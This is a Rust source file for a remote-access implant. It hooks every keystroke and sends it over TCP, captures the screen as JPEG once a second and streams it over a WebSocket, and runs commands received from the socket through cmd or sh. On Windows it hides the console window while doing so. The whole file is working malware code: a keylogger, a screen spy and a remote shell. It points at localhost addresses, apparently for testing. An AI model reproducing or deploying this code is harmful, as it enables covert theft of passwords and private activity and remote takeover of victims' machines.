use tokio::io::{self, AsyncReadExt, AsyncWriteExt, WriteHalf, ReadHalf};
use tokio::sync::mpsc;
use tokio::sync::mpsc::{Sender, Receiver};
use tokio::net::TcpStream;
use tokio::time::Duration;
use tokio_tungstenite::{connect_async, tungstenite::protocol::Message, WebSocketStream};

use futures_util::stream::SplitSink;
use futures_util::{SinkExt, StreamExt};

use image::ExtendedColorType;
use image::codecs::jpeg::JpegEncoder;

use scrap::{Capturer, Display};
use rdev::{Event, listen};
use bytes::Bytes;

use std::io::ErrorKind::WouldBlock;
use std::thread;
use std::process::Command;

#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;

#[tokio::main]
async fn main() -> io::Result<()> {
    let tcpsocket = TcpStream::connect("127.0.0.1:7878").await?;
    let (websocket, _) = 
        connect_async("ws://127.0.0.1:7879/ws").await.expect("failed to connect");

    let (rd_txt, wr_txt) = io::split(tcpsocket);
    let (write, _) = websocket.split(); 

    let (tx1, rx1) = mpsc::channel::<String>(16);
    let (tx2, rx2) = mpsc::channel::<Vec<u8>>(32);

    let worker_a = 
        tokio::spawn(async move {
            read_keystrokes(tx1)
        });
        
    let worker_b = 
        tokio::spawn(async move {
            send_keystrokes(rx1, wr_txt).await
        });

    let worker_c = 
        tokio::spawn(async move {
            take_screenshot(tx2).await
        });

    let workder_d = 
        tokio::spawn(async move {
            send_screenshot(rx2, write).await
        });

    let worker_f = 
        tokio::spawn(async move {
            exec_script(rd_txt).await
        });

    let _ = tokio::try_join!(worker_a, worker_b, worker_c, workder_d, worker_f);

    Ok(())
}

fn read_keystrokes(tx: Sender<String>) {
    tokio::task::spawn_blocking( move || {
        let callback = move |event: Event| {
            match event.name {
                Some(string) => {
                    tx.blocking_send(string).expect("cannot send string");
                },
                None => (),
            }
        };

        if let Err(error) = listen(callback) {
            println!("{:?}", error);
        }
    });
}

async fn send_keystrokes(mut rx: Receiver<String>, mut wr: WriteHalf<TcpStream>) -> io::Result<()> {
    while let Some(data) = rx.recv().await {
        wr.write_all(data.as_bytes()).await?;
    }
    Ok(())
}

async fn take_screenshot(tx: Sender<Vec<u8>>) -> io::Result<()> {
    let frame_duration = Duration::from_secs_f32(1.0);

    tokio::task::spawn_blocking(move || {
        let display = Display::primary()?;
        let mut capturer = Capturer::new(display)?;
        let (w, h) = (capturer.width(), capturer.height());

        let mut rgb = Vec::with_capacity(w * h * 3);

        loop {
            let buffer = match capturer.frame() {
                Ok(buffer) => buffer,
                Err(error) => {
                    if error.kind() == WouldBlock {
                        thread::sleep(Duration::from_millis(100));
                        continue;
                    } else {
                        println!("error: {}", error);
                        break
                    }
                }
            };

            let stride = buffer.len() / h;
            rgb.clear();

            for y in 0..h {
                let row = &buffer[y * stride..y * stride + w * 4];
                for px in row.chunks_exact(4) {
                    rgb.extend_from_slice(&[px[2], px[1], px[0]]);
                }
            }
        
            let mut bytes = Vec::new();
            JpegEncoder::new_with_quality(&mut bytes, 75)
                .encode(&rgb, w as u32, h as u32, ExtendedColorType::Rgb8)
                .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;

            let bytes_len = (bytes.len() as u32).to_be_bytes();

            let mut packet = Vec::new();
            packet.extend_from_slice(&bytes_len);
            packet.extend_from_slice(&bytes);

            if tx.blocking_send(packet).is_err() {
                break;
            }

            thread::sleep(frame_duration);
        }

        Ok::<_, io::Error>(())
    })
    .await?
    .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;

    Ok(())
}

async fn send_screenshot(
    mut rx: Receiver<Vec<u8>>, 
    mut wr: SplitSink<WebSocketStream<tokio_tungstenite::MaybeTlsStream<TcpStream>>, Message>
) -> io::Result<()> {
    while let Some(data) = rx.recv().await {
        if wr.send(Message::Binary(Bytes::from(data))).await.is_err() {
            break;
        }
    }
    Ok(())
}

async fn exec_script(mut rd: ReadHalf<TcpStream>) -> io::Result<()> {
    let mut buf = vec![0; 256];

    loop {
        let n = rd.read(&mut buf).await?;

        if n == 0 {
            break;
        }

        let command = std::str::from_utf8(&buf[..n]);
        
        match command {
            Ok(command) => {
                #[cfg(target_os = "windows")]
                Command::new("cmd")
                    .args(["/C", command])
                    .creation_flags(0x08000000) 
                    .output()
                    .expect("failed to excute command");

                #[cfg(not(target_os = "windows"))]
                Command::new("sh")
                    .args(["-c", command])
                    .output()
                    .expect("failed to excute command");
            }
            Err(_) => println!("cannot decode bytes to str")
        }
    }

    Ok(())
}
